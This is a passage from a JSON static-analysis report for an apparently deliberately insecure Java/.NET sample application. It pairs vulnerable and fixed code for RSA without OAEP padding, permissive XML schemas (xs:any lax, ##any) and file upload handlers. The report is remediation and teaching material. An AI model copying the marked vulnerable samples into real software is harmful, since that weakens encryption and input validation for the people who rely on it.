pubKeyString;\n            {\n                using (StreamReader reader = new StreamReader(publicKeyPath)) { pubKeyString = reader.ReadToEnd(); }\n            } \n            var sr = new StringReader(pubKeyString);\n            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));\n\n            RSACryptoServiceProvider csp = new RSACryptoServiceProvider();\n            csp.ImportParameters((RSAParameters)xs.Deserialize(sr));\n\n            var config = OpenWebConfigFile();\n            var element = config.AppSettings.Settings[&quot;DBPassword&quot;];\n\n            var bytesEncryptedText = csp.Encrypt(System.Text.Encoding.Unicode.GetBytes(element.Value.ToString()), <em class=\"red\">false</em>);\n            var encryptedText = Convert.ToBase64String(bytesEncryptedText);\n\n            if (element != null)\n            {\n                element.Value = encryptedText;\n            }\n            config.Save();\n\n            return RedirectToAction(&quot;../ManageConfigFile/ReadConfigFile&quot;);\n        }", "nonvulncode": "public ActionResult Encryption_RSA()\n        {\n            Create_RSAKey();\n            string pubKeyString;\n            {\n                using (StreamReader reader = new StreamReader(publicKeyPath)) { pubKeyString = reader.ReadToEnd(); }\n            } \n            var sr = new StringReader(pubKeyString);\n            var xs = new System.Xml.Serialization.XmlSerializer(typeof(RSAParameters));\n\n            RSACryptoServiceProvider csp = new RSACryptoServiceProvider();\n            csp.ImportParameters((RSAParameters)xs.Deserialize(sr));\n\n            var config = OpenWebConfigFile();\n            var element = config.AppSettings.Settings[&quot;DBPassword&quot;];\n\n            var bytesEncryptedText = csp.Encrypt(System.Text.Encoding.Unicode.GetBytes(element.Value.ToString()), <em class=\"blue\">true</em>);\n            var encryptedText = Convert.ToBase64String(bytesEncryptedText);\n\n            if (element != null)\n            {\n                element.Value = encryptedText;\n            }\n            config.Save();\n\n            return RedirectToAction(&quot;../ManageConfigFile/ReadConfigFile&quot;);\n        }", "comments": "Increase the encryption complexity by setting your encryption to use OAEP (Optimal asymmetric encryption padding) padding. \nSetting padding to true will perform direct RSA encryption using OAEP padding. \n\nUse good algorithms when transmitting sensitive data, protect data during transit.\nReference: https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.rsacryptoserviceprovider.encrypt?view=netcore-3.1\n\nhttps://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding", "impact": "Minimal in performance as the algorithm is the same.\nThis option is available for a long time, on a computers running OS Windows XP or later, and framework .Net 2.0 and above.", "abstract": "Use of padding"}, {"@type": "JAVA/JSP", "vulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\tSecurity.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;);\n\t\t\tkeyPairGenerator.initialize(4096);\n\t\t\t\t// Generate the KeyPair\n\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\t        \n\t\t\t\t// Get the public and private key\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\t    \n\t\t\t<em class=\"red\">Cipher cipher = Cipher.getInstance(&quot;RSA&quot;);</em>\n\t\t\t//Initialize Cipher for ENCRYPT_MODE\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\n\t\t\t//Perform Encryption\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes()) ;\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class               \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t}         \t\n\t\treturn encryptedText;\n\t}\npublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\n\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \n\t        \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t    }\n\t\treturn mv;\n\t}", "nonvulncode": "private String encryptWithRSA(String pwd) {\n\t\tbyte[] cipherText =null;\n\t\tString encryptedText = null;\n\t\ttry {\n\t\t\t<em class=\"blue\">Security.addProvider(new org.bouncycastle.jce.provider.BouncyCastleProvider());</em>\n\t\t\tKeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;RSA&quot;,&quot;BC&quot;);\n\t\t\tkeyPairGenerator.initialize(4096);\n\t\t\t\t// Generate the KeyPair\n\t\t\tKeyPair keyPair = keyPairGenerator.generateKeyPair();\n\t        \n\t\t\t\t// Get the public and private key\n\t\t\tPublicKey publicKey = keyPair.getPublic();\n\t\t\tPrivateKey privateKey = keyPair.getPrivate();\n\t    \n\t\t\t<em class=\"blue\">Cipher cipher = Cipher.getInstance(&quot;RSA/NONE/OAEPWithSHA1AndMGF1Padding&quot;);</em>\n\t\t\t//Initialize Cipher for ENCRYPT_MODE\n\t\t\tcipher.init(Cipher.ENCRYPT_MODE, publicKey);\n\n\t\t\t//Perform Encryption\n\t\t\tcipherText = cipher.doFinal(pwd.getBytes()) ;\n\t\t\tencryptedText = Base64.getEncoder().encodeToString(cipherText);// Java 8, uses new Base64 class               \n\t\t} catch (NoSuchAlgorithmException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (NoSuchPaddingException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (InvalidKeyException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (IllegalBlockSizeException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (BadPaddingException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t} catch (NoSuchProviderException e) {\n\t\t\tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t}         \t\n\t\treturn encryptedText;\n\t}\npublic ModelAndView downloadPropertyFile( HttpServletResponse response) throws Exception {\n    \tModelAndView mv = new ModelAndView();\n\n\t\ttry (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {\n\n\t\t\tProperties prop = new Properties();\t\t\n\t\t\tprop.load(input);\n\t\t\n\t\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\tString filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t\t\tString fileName = filePath + &quot;sec_conn_encrypted.properties&quot;;\n\n\t\t\tString encryptedText = encryptWithRSA(dbpwd);\n\t\t\tprop.setProperty(&quot;sec_password_encrypted&quot;, encryptedText);\n\t\t\t\n\t\t\tFile file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, &quot;writing encrypted password&quot;);\t\t\t\t\t\t\t        \n\t        \n\t        mv.addObject(&quot;msg&quot;, &quot;Encrypted file downloaded&quot;);\n\t        mv.setViewName(&quot;uploadFile&quot;);\n\t    } catch (Exception e){\t \n\t    \tlogger.error(&quot;error in downloading property file&quot;, e);\n\t\t\tmv.setViewName(&quot;failure&quot;);\n\t        mv.addObject(&quot;msg&quot;, &quot;Error in downloading property file, check log for more information&quot;);\n\t    }\n\t\treturn mv;\n\t}", "comments": "when we use default RSA implementation, it has the default \u201cRSA/ECB/PKCS1Padding\u201d padding, which is not secure. Prefer to use oaep padding. \nUse good algorithms when transmitting sensitive data, protect data during transit.", "impact": "Changing the padding on the message typically has minimal impact on performance as the algorithm and computations are similar. \n\nNote when padding is applied to the key a performance impact is expected (CPU time during encyption/decryption) as it is related to the increase in key size. This impact must be tested and approved to production use.", "abstract": "Use of padding"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Weak XML Schema: Type Any": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/xsd/EmployeeInfo.xsd", "items": [{"id": "IN00485", "function": "null()", "line": "13", "snippet": "<xs:element name=\"gender\" type=\"xs:string\" minOccurs=\"0\"/>\n            <xs:element name=\"city\" type=\"xs:string\" minOccurs=\"0\"/>\n            <xs:any namespace='##any' processContents=\"strict\" minOccurs=\"0\" maxOccurs=\"5\"/>\n          </xs:sequence>\n        </xs:complexType>"}]}], "remediation": {"remediation": {"@id": "R.0049", "@name": "Weak XML Schema: Type Any", "@dateLastModified": "2/24/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">EmployeeInfo.xsd</em>\n&lt;xs:element name=&quot;EmployeeInfo&quot;&gt;\n  &lt;xs:complexType&gt;\n    &lt;xs:sequence&gt;\n      &lt;xs:element name=&quot;employeedtl&quot; maxOccurs=&quot;4&quot;&gt;\n        &lt;xs:complexType&gt;\n          &lt;xs:sequence&gt;\n            &lt;xs:element name=&quot;empName&quot; type=&quot;xs:string&quot;/&gt;\n            &lt;xs:element name=&quot;departmentId&quot; type=&quot;xs:positiveInteger&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:<em class=\"red\">any</em> namespace=&quot;http://empInfo&quot; processContents=&quot;lax&quot; minOccurs=&quot;0&quot; maxOccurs=&quot;5&quot;/&gt;\n          &lt;/xs:sequence&gt;\n        &lt;/xs:complexType&gt;\n      &lt;/xs:element&gt;\n    &lt;/xs:sequence&gt;\n  &lt;/xs:complexType&gt;\n&lt;/xs:element&gt;\n\n<em class=\"bold\">EmployeeAddress.xsd</em>\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; targetNamespace=&quot;http://empInfo&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot;/&gt;\n&lt;xs:complexType name=&quot;empDtlHeader&quot;&gt;\n    &lt;xs:sequence&gt;\n\t\t&lt;xs:element name=&quot;empAddress&quot; type=&quot;xs:string&quot;/&gt;\n\t\t&lt;xs:element name=&quot;empPhone&quot; type=&quot;xs:string&quot;/&gt;\n\t&lt;/xs:sequence&gt;\n&lt;/xs:complexType&gt;\n&lt;/xs:schema&gt;", "nonvulncode": "<em class=\"bold\">EmployeeInfo.xsd</em>\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:import namespace=&quot;http://empInfo&quot; schemaLocation=&quot;EmployeeAddress.xsd&quot; /&gt;\n&lt;xs:element name=&quot;EmployeeInfo&quot;&gt;\n  &lt;xs:complexType&gt;\n    &lt;xs:sequence&gt;\n      <em class=\"blue\">&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot; /&gt;</em>\n      &lt;xs:element name=&quot;employeedtl&quot; maxOccurs=&quot;4&quot;&gt;\n        &lt;xs:complexType&gt;\n          &lt;xs:sequence&gt;\n            &lt;xs:element name=&quot;empName&quot; type=&quot;xs:string&quot;/&gt;\n            &lt;xs:element name=&quot;departmentId&quot; type=&quot;xs:positiveInteger&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n          &lt;/xs:sequence&gt;\n        &lt;/xs:complexType&gt;\n....\n<em class=\"bold\">EmployeeAddress.xsd</em>\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; targetNamespace=&quot;http://empInfo&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot;/&gt;\n&lt;xs:complexType name=&quot;empDtlHeader&quot;&gt;\n    &lt;xs:sequence&gt;\n\t\t&lt;xs:element name=&quot;empAddress&quot; type=&quot;xs:string&quot;/&gt;\n\t\t&lt;xs:element name=&quot;empPhone&quot; type=&quot;xs:string&quot;/&gt;\n\t&lt;/xs:sequence&gt;\n&lt;/xs:complexType&gt;\n&lt;/xs:schema&gt;", "comments": "By specifying processContents as lax, XML document is allowed to have element which is not defined in schema. \nThe generator uses the lax when generating new xsd in order for the developer to test and implement the proper element checks/validations. Developers may forget to remove &quot;lax&quot; after the xsd is created.\nIt is recommended, that the XML document have a precisely defined XML Schema (custom developed) with every piece of information properly restricted to avoid problems of improper data validation. \n\nIn the non vulnerable sample, we added the missing elements (e.g., EmpPhone), and removed the xs:any and lax. Incase you need addition columns to be included you need to add it in the xsd file.\n\nNote: if developer only change &quot;lax&quot; to &quot;strict&quot;, the SAST tools may find another vulnerability on this same line &quot;Weak XML Schema: Type Any&quot;. Replace the xs:any for each element required by the schema.\nNote 2: If the xs:any is required by the application functionality (e.g. variable XML to be processed, with no available schema), extra security mechanisms should be in place to avoid users manipulating the XML before submitting (e.g.: by sending an extra element userRole=&quot;admin&quot;, tricking the application to process the xml and change the entitlements for that user). It is recommended to ask the Pen Testers to validate the solution.", "impact": "When removing the initial &quot;xs:any lax&quot; generated by the IDE, developers will need to add all elements to the schema as required.\nDefault setting when not specified is &quot;strict&quot;.\nCreate and import the xsd containing the validations and elements.", "abstract": "Use of import and detailed xsd definition"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;\n  &lt;xs:element name=&quot;studentInfo&quot;&gt;\n    &lt;xs:complexType&gt;\n      &lt;xs:sequence&gt;\n        &lt;xs:element name=&quot;studentId&quot; maxOccurs=&quot;1&quot; /&gt;\n        &lt;xs:element name=&quot;studentName&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:any processContents=&quot;<em class=\"red\">lax</em>&quot; minOccurs=&quot;1&quot; maxOccurs=&quot;5&quot;/&gt; \n         &lt;/xs:sequence&gt;\n    &lt;/xs:complexType&gt;\n  &lt;/xs:element&gt;\n&lt;/xs:schema&gt;", "nonvulncode": "&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;\n  &lt;xs:element name=&quot;studentInfo&quot;&gt;\n    &lt;xs:complexType&gt;\n      &lt;xs:sequence&gt;\n        &lt;xs:element name=&quot;studentId&quot; maxOccurs=&quot;1&quot; /&gt;\n        &lt;xs:element name=&quot;studentName&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; /&gt;\n<em class=\"blue\">       &lt;!-- Add validation schema for the missing elements --&gt;\n        &lt;xs:element name=&quot;province&quot; type=&quot;xs:string&quot; /&gt;\n</em>     <em class=\"blue\">  &lt;!-- Remove the entry of xs:any and any processContent=&quot;lax&quot;  or set it to strict--&gt;\n\n</em>      &lt;/xs:sequence&gt;\n    &lt;/xs:complexType&gt;\n  &lt;/xs:element&gt;\n&lt;/xs:schema&gt;", "comments": "In the vulnerable code, even if is implemented an xml schema validation in the code it will be ignored. \nBy specifying processContents as xs:any and lax, XML document is allowed to have element which is not defined in schema. \n\nThe generator uses the lax when generating new xsd in order for the developer to test and implement the proper element checks/validations. Developers may forget to remove &quot;lax&quot; after the xsd is created.\n\nIt is recommended, that the XML document have a precisely defined XML Schema (custom developed) with every piece of information properly restricted to avoid problems of improper data validation. \n\nIn the non vulnerable sample, we added the missing elements (e.g., province), and removed the xs:any and lax. Incase you need addition columns to be included you need to add it in the xsd file.\n\nNote: if developer only change &quot;lax&quot; to &quot;strict&quot;, the SAST tools may find another vulnerability on this same line &quot;Weak XML Schema: Type Any&quot;. Replace the xs:any for each element required by the schema.\nNote 2: If the xs:any is required by the application functionality (e.g. variable XML to be processed, with no available schema), extra security mechanisms should be in place to avoid users manipulating the XML before submitting (e.g.: by sending an extra element userRole=&quot;admin&quot;, tricking the application to process the xml and change the entitlements for that user). It is recommended to ask the Pen Testers to validate the solution.", "impact": "When removing the initial &quot;xs:any lax&quot; generated by the IDE, developers will need to add all elements to the schema as required.\nDefault setting when not specified is &quot;strict&quot;.\nCreate and import the xsd containing the validations and elements.", "abstract": "Remove xs:any lax from the xsd definition"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Weak XML Schema: Undefined Namespace": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/xsd/EmployeeInfo.xsd", "items": [{"id": "IN00486", "function": "null()", "line": "13", "snippet": "<xs:element name=\"gender\" type=\"xs:string\" minOccurs=\"0\"/>\n            <xs:element name=\"city\" type=\"xs:string\" minOccurs=\"0\"/>\n            <xs:any namespace='##any' processContents=\"strict\" minOccurs=\"0\" maxOccurs=\"5\"/>\n          </xs:sequence>\n        </xs:complexType>"}]}], "remediation": {"remediation": {"@id": "R.0065", "@name": "Weak XML Schema: Undefined Namespace", "@dateLastModified": "3/5/2021", "faqs": null, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">EmployeeInfo.xsd</em>\n&lt;xs:element name=&quot;EmployeeInfo&quot;&gt;\n  &lt;xs:complexType&gt;\n    &lt;xs:sequence&gt;\n      &lt;xs:element name=&quot;employeedtl&quot; maxOccurs=&quot;4&quot;&gt;\n        &lt;xs:complexType&gt;\n          &lt;xs:sequence&gt;\n            &lt;xs:element name=&quot;empName&quot; type=&quot;xs:string&quot;/&gt;\n            &lt;xs:element name=&quot;departmentId&quot; type=&quot;xs:positiveInteger&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:<em class=\"red\">any</em> <em class=\"red\">namespace='##any'</em> processContents=&quot;lax&quot; minOccurs=&quot;0&quot; maxOccurs=&quot;5&quot;/&gt;\n          &lt;/xs:sequence&gt;\n        &lt;/xs:complexType&gt;\n      &lt;/xs:element&gt;\n    &lt;/xs:sequence&gt;\n  &lt;/xs:complexType&gt;\n&lt;/xs:element&gt;\n\n<em class=\"bold\">EmployeeAddress.xsd</em>\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; targetNamespace=&quot;http://empInfo&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot;/&gt;\n&lt;xs:complexType name=&quot;empDtlHeader&quot;&gt;\n    &lt;xs:sequence&gt;\n\t\t&lt;xs:element name=&quot;empAddress&quot; type=&quot;xs:string&quot;/&gt;\n\t\t&lt;xs:element name=&quot;empPhone&quot; type=&quot;xs:string&quot;/&gt;\n\t&lt;/xs:sequence&gt;\n&lt;/xs:complexType&gt;\n&lt;/xs:schema&gt;", "nonvulncode": "<em class=\"bold\">EmployeeInfo.xsd</em>\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:import namespace=&quot;http://empInfo&quot; schemaLocation=&quot;EmployeeAddress.xsd&quot; /&gt;\n&lt;xs:element name=&quot;EmployeeInfo&quot;&gt;\n  &lt;xs:complexType&gt;\n    &lt;xs:sequence&gt;\n      <em class=\"blue\">&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot; /&gt;</em>\n      &lt;xs:element name=&quot;employeedtl&quot; maxOccurs=&quot;4&quot;&gt;\n        &lt;xs:complexType&gt;\n          &lt;xs:sequence&gt;\n            &lt;xs:element name=&quot;empName&quot; type=&quot;xs:string&quot;/&gt;\n            &lt;xs:element name=&quot;departmentId&quot; type=&quot;xs:positiveInteger&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n            &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; minOccurs=&quot;0&quot;/&gt;\n          &lt;/xs:sequence&gt;\n        &lt;/xs:complexType&gt;\n....\n<em class=\"bold\">EmployeeAddress.xsd</em>\n&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; targetNamespace=&quot;http://empInfo&quot; xmlns:emp=&quot;http://empInfo&quot;&gt;\n&lt;xs:element name=&quot;EmpDtl&quot; type=&quot;emp:empDtlHeader&quot;/&gt;\n&lt;xs:complexType name=&quot;empDtlHeader&quot;&gt;\n    &lt;xs:sequence&gt;\n\t\t&lt;xs:element name=&quot;empAddress&quot; type=&quot;xs:string&quot;/&gt;\n\t\t&lt;xs:element name=&quot;empPhone&quot; type=&quot;xs:string&quot;/&gt;\n\t&lt;/xs:sequence&gt;\n&lt;/xs:complexType&gt;\n&lt;/xs:schema&gt;", "comments": "By specifying namespace as ##any, processContents as lax, XML document is allowed to have elements which are not defined in the schema. \nThe generator uses the lax when generating new xsd in order for the developer to test and implement the proper element checks/validations. Developers may forget to remove &quot;lax&quot; after the xsd is created.\nIt is recommended, that the XML document have a precisely defined XML Schema (custom developed) with every piece of information properly restricted to avoid problems of improper data validation. \n\nIn the non vulnerable sample, we added the missing elements (e.g., EmpDtl), and removed the xs:##any and lax. In case you need additional columns to be included, you need to add it in the xsd file.\n\nNote: if developer only change &quot;lax&quot; to &quot;strict&quot;, the SAST tools may find another vulnerability on this same line &quot;Weak XML Schema: Type Any&quot;. Replace the xs:any for each element required by the schema.\nNote 2: If the xs:any is required by the application functionality (e.g. variable XML to be processed, with no available schema), extra security mechanisms should be in place to avoid users manipulating the XML before submitting (e.g.: by sending an extra element userRole=&quot;admin&quot;, tricking the application to process the xml and change the entitlements for that user). It is recommended to ask the Pen Testers to validate the solution.", "impact": "When removing the initial &quot;xs:any lax&quot; generated by the IDE, developers will need to add all elements to the schema as required.\nDefault setting when not specified is &quot;strict&quot;.\nCreate and import the xsd containing the validations and elements.", "abstract": "Use of import and detailed xsd definition"}, {"@type": ".NET/C#/ASP", "vulncode": "&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;\n  &lt;xs:element name=&quot;studentInfo&quot;&gt;\n    &lt;xs:complexType&gt;\n      &lt;xs:sequence&gt;\n        &lt;xs:element name=&quot;studentId&quot; maxOccurs=&quot;1&quot; /&gt;\n        &lt;xs:element name=&quot;studentName&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:any namespace=&quot;##any&quot; processContents=&quot;lax&quot; minOccurs=&quot;1&quot; maxOccurs=&quot;5&quot;/&gt;\n      &lt;/xs:sequence&gt;\n    &lt;/xs:complexType&gt;\n  &lt;/xs:element&gt;\n&lt;/xs:schema&gt;", "nonvulncode": "&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;xs:schema xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;\n  &lt;xs:element name=&quot;studentInfo&quot;&gt;\n    &lt;xs:complexType&gt;\n      &lt;xs:sequence&gt;\n        &lt;xs:element name=&quot;studentId&quot; maxOccurs=&quot;1&quot; /&gt;\n        &lt;xs:element name=&quot;studentName&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;gender&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:element name=&quot;city&quot; type=&quot;xs:string&quot; /&gt;\n       &lt;!-- Add validation schema for the missing elements --&gt;\n        &lt;xs:element name=&quot;province&quot; type=&quot;xs:string&quot; /&gt;\n        &lt;xs:any namespace=&quot;<em class=\"blue\">http://studentInfo</em>&quot; processContents=&quot;lax&quot; minOccurs=&quot;1&quot; maxOccurs=&quot;5&quot;/&gt;\n      &lt;/xs:sequence&gt;\n    &lt;/xs:complexType&gt;\n  &lt;/xs:element&gt;\n&lt;/xs:schema&gt;", "comments": "By specifying namespace as ##any, processContents as lax, XML document is allowed to have elements which are not defined in the schema. \nThe generator uses the lax when generating new xsd in order for the developer to test and implement the proper element checks/validations. Developers may forget to remove &quot;lax&quot; after the xsd is created.\nIt is recommended, that the XML document have a precisely defined XML Schema (custom developed) with every piece of information properly restricted to avoid problems of improper data validation. \n\nIn the non vulnerable sample, we added the missing elements (e.g., province), and removed the xs:any and lax. Incase you need addition columns to be included you need to add it in the xsd file.\n\nNote: if developer only change &quot;lax&quot; to &quot;strict&quot;, the SAST tools may find another vulnerability on this same line &quot;Weak XML Schema: Type Any&quot;. Replace the xs:any for each element required by the schema.\nNote 2: If the xs:any is required by the application functionality (e.g. variable XML to be processed, with no available schema), extra security mechanisms should be in place to avoid users manipulating the XML before submitting (e.g.: by sending an extra element userRole=&quot;admin&quot;, tricking the application to process the xml and change the entitlements for that user). It is recommended to ask the Pen Testers to validate the solution.", "impact": "When removing the initial &quot;xs:any lax&quot; generated by the IDE, developers will need to add all elements to the schema as required.\nDefault setting when not specified is &quot;strict&quot;.\nCreate and import the xsd containing the validations and elements.", "abstract": "Update the ##any to specific namespace"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Often Misused: File Upload": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00374", "function": "Function: processUpload()", "line": "229", "snippet": "//@ExceptionHandler(MultipartException.class)\n\t@RequestMapping(value=\"fileupload.html\", method=RequestMethod.POST)\n\tpublic ModelAndView processUpload(@RequestParam(\"file\") MultipartFile file) throws IOException,MultipartException {\n\t        // process your file\n\t\tlogger.debug(\"Entering the upload process\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00375", "function": "Function: validateEmployee()", "line": "594", "snippet": "@RequestMapping(value = \"uploademployee.html\", method = RequestMethod.POST)\n\tpublic ModelAndView validateEmployee(@RequestParam(\"file\") MultipartFile file) throws IOException, ParserConfigurationException, SAXException { // process your\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t// file\n\t\tSystem.out.println(\"ModelAndView --- upload\");"}]}, {"file": "WebContent/WEB-INF/jspViews/uploadFile.jsp", "items": [{"id": "IN00376", "function": "null()", "line": "35", "snippet": "<input type=\"hidden\" name=\"${_csrf.parameterName}\" value=\"${_csrf.token}\" />\n    <label for=\"file\">File</label>\n    <input id=\"file\" type=\"file\" name=\"file\" />\n    <p><button type=\"submit\" 